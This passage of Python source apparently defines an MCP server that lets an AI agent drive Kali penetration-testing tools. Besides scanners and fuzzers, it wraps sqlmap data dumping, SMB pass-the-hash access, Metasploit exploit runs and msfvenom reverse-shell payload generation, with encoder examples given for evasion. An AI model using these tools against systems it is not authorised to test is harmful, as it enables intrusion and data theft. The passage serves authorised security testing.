    return await run_kali_tool(tool="nmap-root" if requires_root else "nmap", target=target,
                               options=options, session_id=session_id,
                               allow_dangerous=requires_root)


@mcp.tool()
async def rustscan_fast_scan(
    target: str,
    ports: str = "",
    ulimit: int = 5000,
    nmap_flags: str = "-sV -sC",
    session_id: str = "",
) -> dict[str, Any]:
    """
    RustScan — blazing-fast port scanner that auto-feeds results into Nmap.
    ulimit: open file descriptors (higher = faster, may require system tuning)
    nmap_flags: flags passed to nmap after port discovery
    ports: specific ports to scan (all if empty)
    """
    logger.info(f"⚡ RUSTSCAN: {target} | ulimit={ulimit}")
    port_flag = f"-p {ports}" if ports else ""
    options = f"{port_flag} --ulimit {ulimit} -- {nmap_flags}".strip()
    return await run_kali_tool(tool="rustscan", target=target,
                               options=options, session_id=session_id)


@mcp.tool()
async def masscan_high_speed(
    target: str,
    ports: str = "1-65535",
    rate: int = 1000,
    output_file: str = "",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    Masscan — ultra-fast port scanner capable of scanning the entire internet.
    rate: packets per second (be careful on production networks)
    ports: port ranges e.g. '80,443' or '1-1000' or '0-65535'
    """
    logger.info(f"💨 MASSCAN: {target} | ports={ports} | rate={rate}")
    out_flag = f"-oJ {output_file}" if output_file else ""
    options = f"-p {ports} --rate={rate} {out_flag}".strip()
    return await run_kali_tool(tool="masscan", target=target,
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


@mcp.tool()
async def httpx_probe(
    targets: str | list[str] = "",
    target: str = "",
    ports: str = "",
    status_code: bool = True,
    title: bool = True,
    tech_detect: bool = True,
    follow_redirects: bool = True,
    session_id: str = "",
) -> dict[str, Any]:
    """
    httpx — fast HTTP probing tool to filter live web targets from a target list.
    targets: newline-separated list of hosts/IPs or single target
    ports: comma-separated ports to probe (e.g. '80,443,8080,8443')
    tech_detect: detect web technologies
    """
    logger.info(f"🌐 HTTPX: probing targets | ports={ports}")
    # Backward compatibility:
    # - Some clients send "target" (singular)
    # - Some clients send "targets" as list[str]
    if isinstance(targets, list):
        targets_value = "\n".join([str(t).strip() for t in targets if str(t).strip()])
    else:
        targets_value = str(targets or "").strip()
    if not targets_value and target:
        targets_value = str(target).strip()
    if not targets_value:
        return {"success": False, "error": "targets or target is required"}

    written = _workspace.write("httpx_targets.txt", targets_value)
    if not written.get("success"):
        return written
    flags = ["-json"]
    if status_code: flags.append("-sc")
    if title: flags.append("-title")
    if tech_detect: flags.append("-td")
    if follow_redirects: flags.append("-fr")
    if ports: flags.append(f"-p {ports}")
    options = f"-l {written['path']} {' '.join(flags)}"
    first_target = targets_value.splitlines()[0] if targets_value.splitlines() else "targets"
    return await run_kali_tool(tool="httpx", target=first_target,
                               options=options, session_id=session_id)


@mcp.tool()
async def autorecon_scan(
    target: str,
    output_dir: str = "/tmp/proflupinmind_files/autorecon",
    single_target: bool = True,
    session_id: str = "",
) -> dict[str, Any]:
    """
    AutoRecon — automated multi-service enumeration tool for CTF and pentesting.
    Runs nmap, then automatically launches service-specific enumeration tools.
    """
    logger.info(f"🤖 AUTORECON: {target}")
    options = f"--output {output_dir}" + (" --single-target" if single_target else "")
    return await run_kali_tool(tool="autorecon", target=target,
                               options=options, session_id=session_id)


# ============================================================================
# DEDICATED WEB DIRECTORY & CONTENT DISCOVERY TOOLS
# ============================================================================

@mcp.tool()
async def gobuster_scan(
    url: str,
    mode: str = "dir",
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "",
    threads: int = 10,
    status_codes: str = "200,204,301,302,307,401,403",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Gobuster — directory/file/DNS/vhost brute-forcer written in Go.
    mode: dir (directories) | dns (subdomains) | vhost (virtual hosts) | fuzz
    extensions: file extensions to try e.g. 'php,html,js,txt'
    """
    logger.info(f"📁 GOBUSTER: {url} | mode={mode}")
    ext_flag = f"-x {extensions}" if extensions else ""
    # Include -u url in options so _build_command detects target_already_in_options
    # and does not double-quote the URL as a single shell token.
    options = f"{mode} -u {url} -w {wordlist} -t {threads} -s {status_codes} {ext_flag}".strip()
    return await run_kali_tool(tool="gobuster", target=url,
                               options=options, session_id=session_id)


@mcp.tool()
async def ffuf_scan(
    url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "",
    match_codes: str = "200,204,301,302,307,401,403",
    threads: int = 40,
    output_file: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    ffuf — fast web fuzzer for directory busting, parameter fuzzing, and vhost discovery.
    url: include FUZZ keyword e.g. 'http://target/FUZZ' or 'http://target/?param=FUZZ'
    extensions: auto-appended e.g. 'php,html,txt' (adds /FUZZ.ext variants)
    """
    logger.info(f"💨 FFUF: {url}")
    ext_flag = f"-e .{extensions.replace(',', ',.')}" if extensions else ""
    out_flag = f"-o {output_file} -of json" if output_file else ""
    options = f"-w {wordlist} -mc {match_codes} -t {threads} {ext_flag} {out_flag}".strip()
    return await run_kali_tool(tool="ffuf", target=url,
                               options=options, session_id=session_id)


@mcp.tool()
async def feroxbuster_scan(
    url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "php,html,js,txt",
    depth: int = 2,
    threads: int = 10,
    session_id: str = "",
) -> dict[str, Any]:
    """
    Feroxbuster — fast, recursive content discovery written in Rust.
    depth: recursion depth (0 = unlimited)
    extensions: file extensions to probe
    """
    logger.info(f"🦀 FEROXBUSTER: {url} | depth={depth}")
    ext_flag = f"-x {extensions}" if extensions else ""
    # Include -u url in options so _build_command does not re-add -u and quote the URL.
    options = f"-u {url} -w {wordlist} -d {depth} -t {threads} {ext_flag} --json -q".strip()
    return await run_kali_tool(tool="feroxbuster", target=url,
                               options=options, session_id=session_id)


@mcp.tool()
async def dirb_scan(
    url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "",
    recursive: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    DIRB — web content scanner using dictionary-based attacks.
    extensions: e.g. '.php,.html,.txt'
    recursive: recursively scan found directories
    """
    logger.info(f"📂 DIRB: {url}")
    ext_flag = f"-X {extensions}" if extensions else ""
    rec_flag = "-r" if not recursive else ""
    options = f"{wordlist} {ext_flag} {rec_flag}".strip()
    return await run_kali_tool(tool="dirb", target=url,
                               options=options, session_id=session_id)


@mcp.tool()
async def dirsearch_scan(
    url: str,
    extensions: str = "php,html,js,txt,xml,json",
    wordlist: str = "",
    threads: int = 20,
    recursive: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    dirsearch — advanced web path scanner with recursive discovery and filter support.
    extensions: file extensions to scan
    wordlist: custom wordlist path (uses built-in if empty)
    """
    logger.info(f"🔎 DIRSEARCH: {url} | ext={extensions}")
    wl_flag = f"-w {wordlist}" if wordlist else ""
    rec_flag = "-r" if recursive else ""
    # Include -u url in options so _build_command does not re-add -u and quote the URL.
    options = f"-u {url} -e {extensions} -t {threads} {wl_flag} {rec_flag}".strip()
    return await run_kali_tool(tool="dirsearch", target=url,
                               options=options, session_id=session_id)


@mcp.tool()
async def wfuzz_scan(
    url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    hide_codes: str = "404",
    threads: int = 10,
    data: str = "",
    headers: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    wfuzz — web application fuzzer for finding resources and fuzzing parameters.
    url: include FUZZ keyword e.g. 'http://target/FUZZ' or 'http://target/?p=FUZZ'
    hide_codes: suppress these response codes e.g. '404,403'
    data: POST data body (enables POST mode)
    """
    logger.info(f"🌀 WFUZZ: {url}")
    hide_flag = " ".join(f"--hc {c.strip()}" for c in hide_codes.split(",") if c.strip())
    data_flag = f"-d '{data}'" if data else ""
    hdr_flag = f"-H '{headers}'" if headers else ""
    options = f"-w {wordlist} -t {threads} {hide_flag} {data_flag} {hdr_flag}".strip()
    return await run_kali_tool(tool="wfuzz", target=url,
                               options=options, session_id=session_id)


@mcp.tool()
async def nikto_scan(
    target: str,
    port: int = 0,
    ssl: bool = False,
    plugins: str = "",
    tuning: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Nikto — web server vulnerability scanner checking for 6700+ dangerous files and CVEs.
    port: override port (auto-detected from URL if 0)
    ssl: force SSL/TLS
    plugins: specific plugins to run (all if empty)
    tuning: test types e.g. '1' (files) | '2' (misconfig) | '4' (injection) | 'x' (all)
    """
    logger.info(f"🕵️  NIKTO: {target} | ssl={ssl}")
    port_flag = f"-p {port}" if port else ""
    ssl_flag = "-ssl" if ssl else ""
    plugin_flag = f"-Plugins '{plugins}'" if plugins else ""
    tune_flag = f"-Tuning {tuning}" if tuning else ""
    nikto_target = target
    if port:
        parsed = urlparse(target if "://" in target else f"//{target}")
        nikto_target = parsed.hostname or target.split("/", 1)[0]
    # Nikto accepts either a full URI OR host + -p, but not both.
    options = f"-h {nikto_target} {port_flag} {ssl_flag} {plugin_flag} {tune_flag}".strip()
    return await run_kali_tool(tool="nikto", target=target,
                               options=options, session_id=session_id)


# ============================================================================
# DEDICATED SUBDOMAIN & DNS TOOLS
# ============================================================================

@mcp.tool()
async def subfinder_scan(
    domain: str,
    silent: bool = True,
    all_sources: bool = False,
    output_file: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Subfinder — passive subdomain discovery from 40+ sources (crt.sh, VirusTotal, etc.).
    all_sources: use all available data sources (slower but more complete)
    """
    logger.info(f"🔭 SUBFINDER: {domain} | all={all_sources}")
    silent_flag = "-silent" if silent else "-v"
    all_flag = "-all" if all_sources else ""
    out_flag = f"-o {output_file}" if output_file else ""
    options = f"-d {silent_flag} {all_flag} {out_flag}".strip()
    return await run_kali_tool(tool="subfinder", target=domain,
                               options=options, session_id=session_id)


@mcp.tool()
async def amass_scan(
    domain: str,
    mode: str = "enum",
    passive: bool = False,
    output_file: str = "",
    timeout: int = 300,
    session_id: str = "",
) -> dict[str, Any]:
    """
    Amass — deep attack surface mapping — subdomains, ASNs, IP ranges, CIDR blocks.
    mode: enum (enumerate) | intel (collect intelligence) | viz (visualize) | track | db
    passive: passive-only mode (no active DNS requests)
    """
    logger.info(f"🗺️  AMASS: {domain} | mode={mode} | passive={passive}")
    passive_flag = "-passive" if passive else ""
    out_flag = f"-o {output_file}" if output_file else ""
    options = f"{mode} -d {passive_flag} {out_flag}".strip()
    return await run_kali_tool(tool="amass", target=domain,
                               options=options, session_id=session_id)


@mcp.tool()
async def fierce_scan(
    domain: str,
    threads: int = 5,
    dns_server: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Fierce — DNS reconnaissance and subdomain brute-forcer.
    Performs zone transfer attempts, subdomain enumeration, and adjacent IP scanning.
    """
    logger.info(f"🔥 FIERCE: {domain}")
    dns_flag = f"--dns-servers {dns_server}" if dns_server else ""
    # Domain value must follow --domain immediately; otherwise target gets appended at end.
    options = f"--domain {domain} --threads {threads} {dns_flag}".strip()
    return await run_kali_tool(tool="fierce", target=domain,
                               options=options, session_id=session_id)


@mcp.tool()
async def dnsenum_scan(
    domain: str,
    enum_all: bool = True,
    threads: int = 5,
    wordlist: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    dnsenum — DNS enumeration: A/MX/NS records, zone transfers, and subdomain brute force.
    wordlist: custom subdomain wordlist (uses built-in if empty)
    """
    logger.info(f"🌐 DNSENUM: {domain}")
    wl_flag = f"-f {wordlist} --noreverse" if wordlist else "--noreverse"
    options = f"--threads {threads} {wl_flag}".strip()
    return await run_kali_tool(tool="dnsenum", target=domain,
                               options=options, session_id=session_id)


# ============================================================================
# DEDICATED WEB CRAWLING & URL DISCOVERY TOOLS
# ============================================================================

@mcp.tool()
async def katana_crawl(
    url: str,
    depth: int = 3,
    js_crawl: bool = True,
    headless: bool = False,
    output_file: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Katana — next-generation web crawling framework by ProjectDiscovery.
    js_crawl: parse and crawl JavaScript for endpoints
    headless: use headless browser for JavaScript rendering
    """
    logger.info(f"🕷️  KATANA: {url} | depth={depth} | js={js_crawl}")
    js_flag = "-jc" if js_crawl else ""
    headless_flag = "-hl" if headless else ""
    out_flag = f"-o {output_file}" if output_file else ""
    options = f"-d {depth} {js_flag} {headless_flag} {out_flag} -silent".strip()
    return await run_kali_tool(tool="katana", target=url,
                               options=options, session_id=session_id)


@mcp.tool()
async def hakrawler_crawl(
    url: str,
    depth: int = 2,
    include_subdomains: bool = False,
    plain: bool = True,
    session_id: str = "",
) -> dict[str, Any]:
    """
    Hakrawler — simple, fast web crawler for endpoint and asset discovery.
    include_subdomains: crawl subdomains of the target domain
    plain: plain URL output (easier to pipe into other tools)
    """
    logger.info(f"🕸️  HAKRAWLER: {url} | depth={depth}")
    sub_flag = "-subs" if include_subdomains else ""
    unique_flag = "-u" if plain else ""
    options = f"-d {depth} {sub_flag} {unique_flag}".strip()
    return await run_kali_tool(tool="hakrawler", target=url,
                               options=options, session_id=session_id)


@mcp.tool()
async def gau_discovery(
    domain: str,
    providers: str = "wayback,commoncrawl,otx,urlscan",
    blacklist: str = "ttf,woff,svg,png,jpg,gif",
    session_id: str = "",
) -> dict[str, Any]:
    """
    GetAllURLs (gau) — fetch known URLs from Wayback Machine, Common Crawl, OTX, URLScan.
    providers: comma-separated list of data sources
    blacklist: file extensions to exclude from results
    """
    logger.info(f"📡 GAU: {domain} | providers={providers}")
    prov_flag = f"--providers {providers}" if providers else ""
    bl_flag = f"--blacklist {blacklist}" if blacklist else ""
    options = f"{prov_flag} {bl_flag}".strip()
    return await run_kali_tool(tool="gau", target=domain,
                               options=options, session_id=session_id)


@mcp.tool()
async def waybackurls_discovery(
    domain: str,
    get_versions: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    waybackurls — pull all URLs from the Wayback Machine for a domain.
    get_versions: also fetch all historical page versions (large output)
    """
    logger.info(f"⏮️  WAYBACKURLS: {domain}")
    ver_flag = "--get-versions" if get_versions else ""
    return await run_kali_tool(tool="waybackurls", target=domain,
                               options=ver_flag, session_id=session_id)


# ============================================================================
# DEDICATED PARAMETER DISCOVERY TOOLS
# ============================================================================

@mcp.tool()
async def arjun_scan(
    url: str,
    method: str = "GET",
    wordlist: str = "",
    output_file: str = "",
    stable: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    Arjun — HTTP parameter discovery suite. Finds hidden GET/POST/JSON/XML parameters.
    method: GET | POST | JSON | XML
    stable: use stable mode (fewer requests, higher accuracy for noisy targets)
    """
    logger.info(f"🔎 ARJUN: {url} | method={method}")
    wl_flag = f"-w {wordlist}" if wordlist else ""
    out_flag = f"-o {output_file}" if output_file else ""
    stable_flag = "--stable" if stable else ""
    options = f"-m {method} {wl_flag} {out_flag} {stable_flag}".strip()
    return await run_kali_tool(tool="arjun", target=url,
                               options=options, session_id=session_id)


@mcp.tool()
async def x8_parameter_discovery(
    url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    method: str = "GET",
    disable_colors: bool = True,
    session_id: str = "",
) -> dict[str, Any]:
    """
    x8 — hidden HTTP parameter discovery tool with smart detection.
    Finds parameters that change server behavior or reveal hidden functionality.
    """
    logger.info(f"🎯 X8: {url} | method={method}")
    color_flag = "--disable-colors" if disable_colors else ""
    options = f"-w {wordlist} -X {method} {color_flag}".strip()
    return await run_kali_tool(tool="x8", target=url,
                               options=options, session_id=session_id)


# ============================================================================
# DEDICATED VULNERABILITY SCANNING TOOLS
# ============================================================================

@mcp.tool()
async def nuclei_scan(
    target: str,
    severity: str = "medium,high,critical",
    tags: str = "",
    templates: str = "",
    exclude_tags: str = "",
    rate_limit: int = 150,
    output_file: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Nuclei — fast, template-based vulnerability scanner with 6000+ community templates.
    severity: info | low | medium | high | critical (comma-separated)
    tags: filter by tags e.g. 'cve,rce,sqli,xss'
    templates: specific template path e.g. 'cves/2021/' or 'technologies/'
    """
    logger.info(f"☢️  NUCLEI: {target} | sev={severity} | tags={tags}")
    sev_flag = f"-severity {severity}" if severity else ""
    tags_flag = f"-tags {tags}" if tags else ""
    tpl_flag = f"-t {templates}" if templates else ""
    excl_flag = f"-etags {exclude_tags}" if exclude_tags else ""
    out_flag = f"-o {output_file}" if output_file else ""
    options = f"{sev_flag} {tags_flag} {tpl_flag} {excl_flag} -rl {rate_limit} {out_flag} -silent".strip()
    return await run_kali_tool(tool="nuclei", target=target,
                               options=options, session_id=session_id)


@mcp.tool()
async def sqlmap_scan(
    url: str,
    data: str = "",
    cookie: str = "",
    level: int = 1,
    risk: int = 1,
    dbms: str = "",
    dump: bool = False,
    dbs: bool = False,
    tables: bool = False,
    batch: bool = True,
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    sqlmap — automatic SQL injection detection and exploitation tool.
    level: 1-5 (tests to perform, higher = more thorough but slower)
    risk: 1-3 (risk of tests, higher = more aggressive)
    dbms: force backend DBMS e.g. 'mysql' | 'postgresql' | 'mssql' | 'oracle'
    dbs: enumerate databases | tables: enumerate tables | dump: dump data
    """
    logger.info(f"💉 SQLMAP: {url} | level={level} | risk={risk}")
    data_flag = f"--data='{data}'" if data else ""
    cookie_flag = f"--cookie='{cookie}'" if cookie else ""
    dbms_flag = f"--dbms={dbms}" if dbms else ""
    dump_flag = "--dump" if dump else ""
    dbs_flag = "--dbs" if dbs else ""
    tbl_flag = "--tables" if tables else ""
    batch_flag = "--batch" if batch else ""
    options = (f"{data_flag} {cookie_flag} --level={level} --risk={risk} "
               f"{dbms_flag} {dump_flag} {dbs_flag} {tbl_flag} {batch_flag}").strip()
    return await run_kali_tool(tool="sqlmap", target=url,
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


# ============================================================================
# DEDICATED SMB / WINDOWS ENUMERATION TOOLS
# ============================================================================

@mcp.tool()
async def smbmap_scan(
    target: str,
    username: str = "",
    password: str = "",
    domain: str = "",
    hash: str = "",
    download: str = "",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    SMBMap — enumerate SMB shares, permissions, and files across domains.
    Supports null sessions, credential-based, and pass-the-hash authentication.
    hash: NTLM hash for pass-the-hash (format: LMHASH:NTHASH)
    download: path to file to download e.g. 'C$\\secret.txt'
    """
    logger.info(f"📂 SMBMAP: {target} | user={username}")
    cred_flags = ""
    if username and hash:
        cred_flags = f"-u {username} -p {hash} --no-pass"
    elif username:
        cred_flags = f"-u {username} -p '{password}'" if password else f"-u {username}"
    domain_flag = f"-d {domain}" if domain else ""
    dl_flag = f"--download {download}" if download else ""
    # Include -H target in options so run_kali_tool doesn't append a second raw target.
    options = f"-H {shlex.quote(target)} {cred_flags} {domain_flag} {dl_flag}".strip()
    return await run_kali_tool(tool="smbmap", target=target,
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


@mcp.tool()
async def enum4linux_scan(
    target: str,
    all_checks: bool = True,
    username: str = "",
    password: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    enum4linux — enumerate information from Windows/Samba hosts via SMB.
    Retrieves users, groups, shares, password policy, and OS info.
    all_checks: run all enumeration checks (-a flag)
    """
    logger.info(f"🪟 ENUM4LINUX: {target}")
    all_flag = "-a" if all_checks else ""
    cred_flag = f"-u {username} -p '{password}'" if username else ""
    options = f"{all_flag} {cred_flag}".strip()
    return await run_kali_tool(tool="enum4linux", target=target,
                               options=options, session_id=session_id)


@mcp.tool()
async def enum4linux_ng_advanced(
    target: str,
    username: str = "",
    password: str = "",
    workgroup: str = "",
    output_format: str = "text",
    session_id: str = "",
) -> dict[str, Any]:
    """
    enum4linux-ng — rewritten enum4linux with better error handling and JSON output.
    Enumerates SMB users, groups, shares, password policy, and OS details.
    output_format: text | json | yaml
    """
    logger.info(f"🪟 ENUM4LINUX-NG: {target}")
    cred_flag = f"-u {username} -p '{password}'" if username else ""
    wg_flag = f"-w {workgroup}" if workgroup else ""
    fmt_flag = f"-oA /tmp/proflupinmind_files/enum4linux_{target}" if output_format != "text" else ""
    options = f"-A {cred_flag} {wg_flag} {fmt_flag}".strip()
    return await run_kali_tool(tool="enum4linux-ng", target=target,
                               options=options, session_id=session_id)


@mcp.tool()
async def rpcclient_enumeration(
    target: str,
    username: str = "",
    password: str = "",
    commands: str = "enumdomusers,enumdomgroups,netshareenumall,getdompwinfo",
    null_session: bool = True,
    session_id: str = "",
) -> dict[str, Any]:
    """
    rpcclient — SMB RPC enumeration via null or authenticated sessions.
    commands: comma-separated rpcclient commands to run
    null_session: attempt null/anonymous session first
    """
    logger.info(f"🔌 RPCCLIENT: {target} | null={null_session}")
    if null_session and not username:
        cred_flag = "-U '' -N"
    elif username:
        cred_flag = f"-U '{username}%{password}'"
    else:
        cred_flag = "-U '' -N"
    cmd_list = " ".join(f"-c '{c.strip()}'" for c in commands.split(",") if c.strip())
    options = f"{cred_flag} {cmd_list}"
    return await run_kali_tool(tool="rpcclient", target=target,
                               options=options, session_id=session_id)


@mcp.tool()
async def snmpwalk_scan(
    target: str,
    community: str = "public",
    version: str = "2c",
    oid: str = "1.3.6.1.2.1.1",
    timeout: int = 2,
    retries: int = 1,
    session_id: str = "",
) -> dict[str, Any]:
    """
    snmpwalk — enumerate SNMP data from a target with an explicit OID root.
    """
    logger.info(f"📶 SNMPWALK: {target} | v={version} | oid={oid}")
    options = f"-v{version} -c {community} -t {timeout} -r {retries} {shlex.quote(target)} {oid}"
    return await run_kali_tool(tool="snmpwalk", target=target, options=options, session_id=session_id)


@mcp.tool()
async def onesixtyone_scan(
    target: str,
    community: str = "public",
    community_file: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    onesixtyone — SNMP community scanner.
    community_file: optional path to community dictionary file.
    """
    logger.info(f"📶 ONESIXTYONE: {target}")
    if community_file:
        options = f"-c {shlex.quote(community_file)}"
    else:
        options = shlex.quote(community)
    return await run_kali_tool(tool="onesixtyone", target=target, options=options, session_id=session_id)


@mcp.tool()
async def smbclient_list_shares(
    host: str,
    username: str = "",
    password: str = "",
    no_pass: bool = True,
    grepable: bool = True,
    session_id: str = "",
) -> dict[str, Any]:
    """
    smbclient — list SMB shares on a host with optional auth.
    """
    logger.info(f"📂 SMBCLIENT: host={host}")
    auth_flag = ""
    if username:
        auth_flag = f"-U '{username}%{password}'" if password else f"-U '{username}'"
    elif no_pass:
        auth_flag = "-N"
    grep_flag = "-g" if grepable else ""
    options = f"-L {shlex.quote(host)} {auth_flag} {grep_flag}".strip()
    return await run_kali_tool(tool="smbclient", target=host, options=options, session_id=session_id)


@mcp.tool()
async def nbtscan_netbios(
    target: str,
    verbose: bool = False,
    timeout: int = 2,
    session_id: str = "",
) -> dict[str, Any]:
    """
    nbtscan — scan networks for NetBIOS name information (hostnames, MACs, domain roles).
    target: single IP, range (192.168.1.0/24), or range (192.168.1.1-254)
    """
    logger.info(f"📡 NBTSCAN: {target}")
    verb_flag = "-v" if verbose else ""
    options = f"-s 3 -t {timeout} {verb_flag}".strip()
    return await run_kali_tool(tool="nbtscan", target=target,
                               options=options, session_id=session_id)


@mcp.tool()
async def arp_scan_discovery(
    target: str = "",
    interface: str = "eth0",
    local_network: bool = True,
    session_id: str = "",
) -> dict[str, Any]:
    """
    arp-scan — send ARP requests to discover all live hosts on the local network.
    local_network: scan the entire local network via --localnet flag
    interface: network interface to use
    """
    logger.info(f"📡 ARP-SCAN: target={target or 'localnet'} | iface={interface}")
    if local_network and not target:
        options = f"--localnet -I {interface}"
    else:
        options = f"-I {interface}"
    return await run_kali_tool(tool="arp-scan", target=target or "localnet",
                               options=options, session_id=session_id)


# ============================================================================
# DEDICATED EXPLOITATION & PAYLOAD TOOLS
# ============================================================================

@mcp.tool()
async def metasploit_run(
    module: str,
    options: dict[str, Any] | None = None,
    payload: str = "",
    run_exploit: bool = False,
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    Metasploit Framework — world's most used penetration testing platform.
    module: full module path e.g. 'exploit/multi/handler' | 'auxiliary/scanner/smb/smb_ms17_010'
    options: dict of module options e.g. {'RHOSTS': '192.168.1.1', 'LPORT': '4444'}
    payload: payload module e.g. 'windows/x64/meterpreter/reverse_tcp'
    run_exploit: set to True to actually run (not just check)
    """
    logger.info(f"🎯 METASPLOIT: {module} | run={run_exploit}")
    opts = options or {}
    set_cmds = " ".join(f"set {k} {v};" for k, v in opts.items())
    payload_cmd = f"set PAYLOAD {payload};" if payload else ""
    run_cmd = "run;" if run_exploit else "check;"
    rc_script = f"use {module}; {set_cmds} {payload_cmd} {run_cmd} exit"
    written = _workspace.write("msf_script.rc", rc_script)
    if not written.get("success"):
        return written
    return await run_kali_tool(tool="msfconsole", target=module,
                               options=f"-q -r {written['path']}",
                               session_id=session_id, allow_dangerous=allow_dangerous)


@mcp.tool()
async def msfvenom_generate(
    payload: str,
    lhost: str = "",
    lport: int = 4444,
    format: str = "elf",
    output_file: str = "",
    encoder: str = "",
    iterations: int = 1,
    extra_opts: str = "",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    msfvenom — generate shellcode, executables, and payloads for penetration testing.
    payload: e.g. 'linux/x64/meterpreter/reverse_tcp' | 'windows/x64/shell/reverse_tcp'
              | 'php/meterpreter/reverse_tcp' | 'java/meterpreter/reverse_tcp'
    format: elf | exe | dll | macho | raw | c | py | php | asp | war | jar
    encoder: e.g. 'x86/shikata_ga_nai' | 'x64/xor_dynamic'
    """
    logger.info(f"💣 MSFVENOM: {payload} | fmt={format} | lhost={lhost}:{lport}")
    out_flag = f"-o {output_file}" if output_file else ""
    lhost_flag = f"LHOST={lhost}" if lhost else ""
    enc_flag = f"-e {encoder} -i {iterations}" if encoder else ""
    options = (f"-p {payload} {lhost_flag} LPORT={lport} "
               f"-f {format} {enc_flag} {out_flag} {extra_opts}").strip()
    return await run_kali_tool(tool="msfvenom", target=payload,
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


# ============================================================================
# DEDICATED BINARY ANALYSIS TOOLS
# ============================================================================

@mcp.tool()
async def objdump_analyze(
    binary_path: str,
    disassemble: bool = True,
    section: str = "",
    dynamic: bool = False,
    symbols: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    objdump — display object file info: disassembly, headers, symbols, dynamic section.
    disassemble: disassemble code sections (-d)
    section: specific section to disassemble e.g. '.text' | '.plt'
    dynamic: display dynamic section and tags
    symbols: display symbol table
    """
    logger.info(f"🔬 OBJDUMP: {binary_path} | disasm={disassemble}")
    dis_flag = "-d" if disassemble else ""
    sec_flag = f"--section={section}" if section else ""
    dyn_flag = "-p" if dynamic else ""
    sym_flag = "-t" if symbols else ""
    options = f"{dis_flag} {sec_flag} {dyn_flag} {sym_flag} -M intel".strip()
    return await run_kali_tool(tool="objdump", target=binary_path,
                               options=options, session_id=session_id)


@mcp.tool()
async def gdb_peda_debug(
    binary_path: str,
    commands: str = "checksec\ninfo functions\nquit",
    args: str = "",
    attach_pid: int = 0,
    session_id: str = "",
) -> dict[str, Any]:
    """
    GDB with PEDA (Python Exploit Development Assistance) — enhanced debugger for exploit dev.
    PEDA adds pattern generation, ROP gadget search, and enhanced display.
    commands: newline-separated GDB/PEDA commands (e.g. 'pattern create 200\\nrun\\npattern offset $eip')
    attach_pid: attach to running process by PID instead of running binary
    """
    logger.info(f"🐛 GDB-PEDA: {binary_path} | pid={attach_pid}")
    peda_src = "-ex 'source /usr/share/peda/peda.py'"
    if attach_pid:
        batch_cmds = " ".join(f"-ex '{c.strip()}'" for c in commands.splitlines() if c.strip())
        options = f"{peda_src} -ex 'attach {attach_pid}' {batch_cmds} {args}"
        return await run_kali_tool(tool="gdb", target=str(attach_pid),
                                   options=options, session_id=session_id)
    batch_cmds = " ".join(f"-ex '{c.strip()}'" for c in commands.splitlines() if c.strip())
    options = f"-batch {peda_src} {batch_cmds} {args}".strip()
    return await run_kali_tool(tool="gdb", target=binary_path,
                               options=options, session_id=session_id)


# ============================================================================
# DEDICATED BUG BOUNTY SPECIALIZED WORKFLOWS
# ============================================================================

@mcp.tool()
async def bugbounty_reconnaissance_workflow(
    target: str,
    scope: list[str] | None = None,
    passive_only: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    Bug bounty recon workflow — comprehensive subdomain + URL + tech discovery pipeline.
    Runs: subfinder → amass → httpx → gau → waybackurls → katana → nuclei (tech detect)
    passive_only: skip active probing (subfinder + gau + waybackurls only)
    """
    logger.info(f"🎯 BB-RECON: {target} | passive={passive_only}")
    context, sid = _context_for(target, session_id)
    results = {}

    https_target = f"https://{target}" if not target.startswith("http") else target
    steps = [
        ("subfinder", target, "-all -recursive -silent"),
        ("amass", target, "enum -passive" if passive_only else "enum"),
        ("httpx", target, f"-u {https_target} -silent -sc -title -td -no-color"),
    ]
    if not passive_only:
        steps += [
            ("katana", target, f"-u {https_target} -d 3 -jc -silent"),
            ("gau", target, "--providers wayback,commoncrawl,otx"),
            ("waybackurls", target, ""),
            ("nuclei", target, f"-u {https_target} -as -tags tech-detect"),
            ("wafw00f", target, https_target),
        ]

    for tool, tgt, opts in steps:
        logger.info(f"  ▶ {tool}")
        result = await run_kali_tool(tool=tool, target=tgt, options=opts,
                                     session_id=sid, read_only=True)
        results[tool] = {"output": result.get("output", "")[:3000], "exit_code": result.get("exit_code")}

    return {"session_id": sid, "target": target, "passive_only": passive_only,
            "scope": scope or [target], "results": results}


@mcp.tool()
async def bugbounty_vulnerability_hunting(
    target: str,
    vuln_types: list[str] | None = None,
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    Bug bounty vulnerability hunting — run targeted vuln scans for high-impact findings.
